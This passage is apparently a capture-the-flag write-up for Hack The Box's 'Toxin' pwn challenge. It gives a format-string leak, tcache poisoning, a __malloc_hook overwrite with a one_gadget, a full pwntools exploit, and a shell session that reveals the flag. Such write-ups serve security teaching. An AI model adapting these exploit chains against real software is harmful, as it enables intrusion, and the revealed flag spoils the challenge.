 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin5.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin6.jpg)

3. Drink toxin for testing — which frees the chunk, but only once(1).

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin7.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin8.jpg)

4. Search for toxin record — format string vulnerability(1) allows leaking data.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin9.jpg)

First vulnerability — format string:

As can be seen above, format string vulnerability could be spotted during source code analysis.

There is another way how you can spot this kind of vulnerabilities using dynamic binary analysis with GEF format-string-helper functionality:

``` bash
gef➤  format-string-helper

[+] Enabled 5 FormatStringBreakpoint
gef➤  r
Starting program: /root/hackthebox/challenge/pwn/Toxin/toxin 
Welcome to Toxin, a low-capacity lab designed to store, record and keep track of chemical toxins.
1. Record toxin
2. Edit existing toxin record
3. Drink toxin for testing
4. Search for toxin record
Enter your lab code.
> 4
Time to search the archives!
Enter search term: luci

Breakpoint 1, __printf (format=0x7fffffffde1a "luci\n") at printf.c:28
28      printf.c: 没有那个文件或目录.
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x10              
$rsp   : 0x00007fffffffde08  →  0x00005555555556b3  →  <search_toxin+218> lea rdi, [rip+0xbb3]        # 0x55555555626d                                                                                                                
$rbp   : 0x00007fffffffde20  →  0x00007fffffffde40  →  0x00005555555556d0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffde1a  →  0xde40000a6963756c ("luci\n"?)
$rdi   : 0x00007fffffffde1a  →  0xde40000a6963756c ("luci\n"?)
$rip   : 0x00007ffff7a48e80  →  <printf+0> sub rsp, 0xd8
$r8    : 0x13              
$r9    : 0x0               
$r10   : 0x00007ffff7b82cc0  →  0x0002000200020002
$r11   : 0x246             
$r12   : 0x00005555555550d0  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdf20  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde08│+0x0000: 0x00005555555556b3  →  <search_toxin+218> lea rdi, [rip+0xbb3]        # 0x55555555626d ← $rsp                                                                                                             
0x00007fffffffde10│+0x0008: 0x00000003ffffde40
0x00007fffffffde18│+0x0010: 0x000a6963756c50d0
0x00007fffffffde20│+0x0018: 0x00007fffffffde40  →  0x00005555555556d0  →  <__libc_csu_init+0> push r15   ← $rbp
0x00007fffffffde28│+0x0020: 0x0000555555555284  →  <main+207> jmp 0x555555555292 <main+221>
0x00007fffffffde30│+0x0028: 0x00007fffffffdf20  →  0x0000000000000001
0x00007fffffffde38│+0x0030: 0x0000000400000000
0x00007fffffffde40│+0x0038: 0x00005555555556d0  →  <__libc_csu_init+0> push r15
────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7a48e6c <fprintf+172>    call   0x7ffff7b18c80 <__stack_chk_fail>
   0x7ffff7a48e71                  nop    WORD PTR cs:[rax+rax*1+0x0]
   0x7ffff7a48e7b                  nop    DWORD PTR [rax+rax*1+0x0]
 → 0x7ffff7a48e80 <printf+0>       sub    rsp, 0xd8
   0x7ffff7a48e87 <printf+7>       test   al, al
   0x7ffff7a48e89 <printf+9>       mov    QWORD PTR [rsp+0x28], rsi
   0x7ffff7a48e8e <printf+14>      mov    QWORD PTR [rsp+0x30], rdx
   0x7ffff7a48e93 <printf+19>      mov    QWORD PTR [rsp+0x38], rcx
   0x7ffff7a48e98 <printf+24>      mov    QWORD PTR [rsp+0x40], r8
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "toxin", stopped 0x7ffff7a48e80 in __printf (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7a48e80 → __printf(format=0x7fffffffde1a "luci\n")
[#1] 0x5555555556b3 → search_toxin()
[#2] 0x555555555284 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────── extra ────
[*] Format string helper
Possible insecure format string: printf('$rdi'  →  0x7fffffffde1a: 'luci\n')
Reason: Call to 'printf()' with format string argument in position #0 is in page 0x7ffffffde000 ([stack]) that has write permission
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

There are some limitations for the search toxin input, but it could be easily bypassed by the direct parameter access:

``` bash
from pwn import *

p = process("./toxin")
sleep(0.5)

def fs_vuln(c):
    p.sendline("4")
    p.recv()
    p.send("%"+str(c)+"$p\x00")
    leak = (p.recvline()).split(" ")[0]
    print(str(c) + ": " + leak)
    p.recv()

for i in range(1,10):
    fs_vuln(i)

p.interactive()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Toxin]
└─# python exploit1.py                                                                                            
[+] Starting local process './toxin': pid 2535
1: 0x7ffc6ff42c1a
2: 0x10
3: 0x7f4005938081    # 3rd addr will be used for calculating libc base addr
4: 0x13
5: (nil)
6: 0x36ff42c40
7: 0x7024372520d0
8: 0x7ffc6ff42c40
9: 0x5597839c2284    # 9rd addr will be used for calculating elf base addr
```

So basically above leakage will be used to bypass ASLR and PIE and it will be the first step in the exploit chain.

``` bash
### Leak & convert & calculate ---
libc_leak  = int(fs_vuln(3),16) - 0x110081
elf_leak = int(fs_vuln(9),16) -  0x1284
log.success("Libc base: " + hex(libc_leak))
log.success("Elf  base: " + hex(elf_leak))
# ---
```

4. Tcache poisoning — overwriting the chunk Forward Pointer:

To overwrite the Forward Pointer, you have to do 3 steps:

1. Allocate a new chunk @toxing_index[0].
2. Free this chunk.
3. Edit this chunk to overwrite the Forward Pointer.

The below functions will help you achieve that:

``` bash
# 1. Add toxin    => Allocate chunk
def add_toxin(length,index,data):
    p.sendline("1")
    p.recv()
    p.sendline(str(length))
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(data)
    p.recv()
# 2. Drink toxin  => Free chunk
def drink_toxin(index):
    p.sendline("3")
    p.recv()
    p.sendline(str(index))
    p.recv()
# 3. Edit toxin   => Rewrite the fd of the freed chunk
def edit_toxin(index,data):
    p.sendline("2")
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(data)
    p.recv()
add_toxin(100,0,"A"*8)
drink_toxin(0)
edit_toxin(0,"B"*8)
gdb.attach(p)
p.interactive()
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin10.jpg)

``` bash
gef➤  heap bins
─────────────────────────────────────── Tcachebins for arena 0x7f24c9088c40 ───────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x5570f53ef260, size=0x70, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x4242424242424242]
──────────────────────────────────────── Fastbins for arena 0x7f24c9088c40 ────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────── Unsorted Bin for arena 'main_arena' ───────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────────────── Small Bins for arena 'main_arena' ────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────────── Large Bins for arena 'main_arena' ────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

As you can see above, the Tcache was poisoned by "B" characters, now when you try to allocate another chunk with add_toxin(100,1,"C"*8) you will write data where the 0x5570f53ef260 points to:

``` bash
gef➤  heap bins tcache
─────────────────────────────────────── Tcachebins for arena 0x7f24c9088c40 ───────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x5570f53ef260, size=0x70, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x4242424242424242]
gef➤  x/gx 0x5570f53ef260
0x5570f53ef260: 0x4242424242424242
gef➤  heap bins tcache
─────────────────────────────────────── Tcachebins for arena 0x7f24c9088c40 ───────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x5570f53ef260, size=0x70, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x4242424242424242]
gef➤  x/gx 0x5570f53ef260
0x5570f53ef260: 0x4343434343434343
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin11.jpg)

So now, after another allocation, you will write where 4242424242424242 points to, as before — you can see below, how the Tcache pointer to the next allocation is stored:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin12.jpg)

As you can conclude, another allocation results in an infinite loop of the binary because we cannot allocate memory in the 0x4242424242424242.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin13.jpg)

Although this could be utilized to exploit the binary, by poisoning the Tcache with a valid pointer in the binary.

The structure of the first 16B of memory where the Tcachepointer points to is important and it should look like this:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin14.jpg)

(1) is the next chunk length and (2) is a pointer to the next chunk, fortunately, there is a pointer in the binary which points to a similar structure in the binary and this is toxinfreed-19 .

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin15.jpg)

``` bash
gef➤  x &toxinfreed
0x5570f51a0050 <toxinfreed>:    0x0000000000000001
gef➤  x/2gx 0x5570f51a0050 - 19
0x5570f51a003d: 0x24c9089680000000      0x000000000000007f
```

What's even more fortunate, you can overwrite toxins using the above flaw, by allocating 3rd chunk (toxin[2]) because toxinfreed is just before the toxins array:

``` bash
gef➤  x/16gx &toxinfreed
0x5570f51a0050 <toxinfreed>:    0x0000000000000001      0x0000000000000000
0x5570f51a0060 <toxins>:        0x00005570f53ef260      0x0000000000000000
0x5570f51a0070 <toxins+16>:     0x0000000000000000      0x0000000000000000
0x5570f51a0080 <sizes>: 0x0000000000000064      0x0000000000000000
0x5570f51a0090 <sizes+16>:      0x0000000000000000      0x0000000000006000
0x5570f51a00a0: 0x0000000000000000      0x0001000300000000
0x5570f51a00b0: 0x0000000000000340      0x0000000000000000
0x5570f51a00c0: 0x0018000300000000      0x0000000000005200
```

5. Exploit the binary — overwriting __malloc_hook:

In this case, every allocation will call __malloc_hook and __malloc_hook will call every function that points to.

So in order to use the above-described flaw, you can overwrite toxin[0] with a toxinfreed-19 using edit_toxin and then set the __malloc_hook pointer using add_toxin to allocate bytes from toxinfreed-19 address.

``` bash
### Small proof of concept how the memory is being overwritten

add_toxin(0x70,0,"A"*8)
drink_toxin(0)
edit_toxin(0,p64(0x55555555803d)) # toxinfreed - 19
add_toxin(100,1,"C"*8)
add_toxin(100,2,"D"*8 + "E"*8 + "F"*8 + "G" *8 ) # Overwriting
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin16.jpg)

As you can see above, you can overwrite everything that is needed to successfully exploit this binary.

Now do some calculation — because one_gadget and __malloc_hook address should be added to the leaked libc base address.

Additionally, you have to align pointers properly in memory, with null bytes.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin17.jpg)

In the end, you have to call malloc() which is called when you add a new toxin, which in fact call __malloc_hook, which points to one_gadget address and thus calls it — and that's it!

final Local && Remote exploit:

local test this script:

``` bash
### Local && Remote exploit - 

from pwn import *

context.log_level = "info"
p = process("./toxin") # uncomment for the local
#p = remote("138.68.131.63","31501") # uncomment for the remote
elf = ELF("/root/hackthebox/challenge/pwn/Toxin/toxin")
Libc = elf.libc
sleep(0.5)

def fs_vuln(c):
    p.sendline("4")
    p.recv()
    p.send("%"+str(c)+"$p\x00")
    leak = (p.recvline()).split(" ")[0] # uncomment for the local
    p.recvline()
    #leak = (p.recvline()).split(" ")[3] # uncomment for the remote 
    print(str(c) + ": " + leak)
    p.recv()
    return leak

def add_toxin(length,index,data):
    p.sendline("1")
    sleep(0.5)
    p.recv()
    p.sendline(str(length))
    sleep(0.5)
    p.recv()
    p.sendline(str(index))
    sleep(0.5)
    p.recv()
    p.send(data)
    sleep(0.5)
    p.recv()

def edit_toxin(index,data):
    p.sendline("2")
    sleep(0.5)
    p.recv()
    sleep(0.5)
    p.sendline(str(index))
    sleep(0.5)
    p.recv()
    p.send(data)
    sleep(0.5)
    p.recv()

def drink_toxin(index):
    p.sendline("3")
    sleep(0.5)
    p.recv()
    p.sendline(str(index))
    sleep(0.5)
    p.recv()

### Leak & convert & calculate ---
libc_leak  = int(fs_vuln(3),16) - 0x110081
elf_leak = int(fs_vuln(9),16) -  0x1284
log.success("[+] Libc base: " + hex(libc_leak))
log.success("[+] Elf  base: " + hex(elf_leak))

add_toxin(100,0,"A"*8)
drink_toxin(0)
edit_toxin(0,p64(elf_leak + elf.symbols["toxinfreed"] - 0x13))
print "[+] leaked {toxinfreed - 0x13} addr: ", hex((elf_leak + elf.symbols["toxinfreed"] - 0x13))

add_toxin(100,1,"C"*8)
payload = "\x00"*35
payload += p64(libc_leak + Libc.symbols['__malloc_hook'])
payload += p64(0)*3
print "[+] payload: ", payload
print "[+] leaked __malloc_hook: ", hex((libc_leak + Libc.symbols['__malloc_hook']))

add_toxin(100,2,payload)
edit_toxin(0,p64(libc_leak + 0x10a38c))
print "[+] leaked onegadget addr: ", hex((libc_leak + 0x10a38c))
print "[+] Call __malloc_hook and get the shell..."
### Call __malloc_hook and get the shell ---

p.sendline("1")
p.recv()
p.sendline("1")
p.recv()
p.sendline("1")

p.interactive()
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin18.jpg)

use it against remote binary, as well with one modification commented out above.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin19.jpg)

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Toxin]
└─# python exploit1.py 
[+] Opening connection to 64.227.38.214 on port 30461: Done
[*] '/root/hackthebox/challenge/pwn/Toxin/toxin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  './lib/'
[*] u'/root/hackthebox/challenge/pwn/Toxin/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
3: 0x7f4874fa6081
9: 0x5582a0aa5284
[+] [+] Libc base: 0x7f4874e96000
[+] [+] Elf  base: 0x5582a0aa4000
[+] leaked {toxinfreed - 0x13} addr:  0x5582a0aa803d
[+] payload:  \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1cuH\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
[+] leaked __malloc_hook:  0x7f4875281c30
[+] leaked onegadget addr:  0x7f4874fa038c
[+] Call __malloc_hook and get the shell...
[*] Switching to interactive mode

Toxin chemical formula length: Toxin index: $ id
uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)
$ whoami
pwn
$ ls
flag.txt
lib
toxin
$ cat flag.txt
HTB{tc4ch3_t0x1n4t10n???_0r_tc4ch3_p01So1n1NG??+F0rm4t...4m@ZiNg!!!}
```
<!-- kb:end toxin -->

</details>

